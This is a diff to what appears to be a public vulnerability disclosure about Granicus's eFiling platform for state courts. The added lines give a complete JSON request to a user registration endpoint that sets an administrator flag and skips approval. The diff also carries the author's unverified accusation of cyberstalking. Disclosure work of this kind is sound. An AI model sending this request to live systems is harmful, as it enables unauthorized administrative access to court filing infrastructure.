@@ -10,6 +10,20 @@ Vulnerabilities in the eFiling platform from [Granicus](https://granicus.com/) a
 
 Granicus's eFiling platform is used statewide in [Florida](https://www.myflcourtaccess.com/default.aspx) and [Arizona](https://efile.azcourts.gov/).
 
+Users could be registered by sending a POST request to the `/api/Security/RegisterUser` endpoint with the following JSON.
+
+```
+{
+  "User":{
+    "OrganizationId":"0","IsAdministrator":true,"UserTypeCode":"10","IdType":-1,"IdTypeSpecified":false,"IdState":"-1","IdNumber":"",
+    "LogonName":"<username>","LogonPassword":"<password>","FirstName":"Example","MiddleName":"","LastName":"User","Suffix":"",
+    "PrimaryEmailAddress":"fake@example.com","AlternateEmailAddress1":"","AlternateEmailAddress2":"",
+    "Address1":"123 Fake St","Address2":"","Country":"US","CountryCode":"US","City":"Beverly Hills","State":"CA","ZipCode":"90210",
+    "PhoneNumber":"","PhoneExtension":""
+  },"ForceToPendingApproval":false,"ForceCreateUser":false
+}
+```
+
 _Note: Shortly after receiving my report, Granicus evidently leaked my information to the Arizona Supreme Court. For the next two months, Granicus and the Arizona Supreme Court cyberstalked me; my LinkedIn profile was viewed repeatedly, sometimes multiple times per day, by several employees from each company._
 
 ### [Disorder in the Court](https://github.com/qwell/disorder-in-the-court)
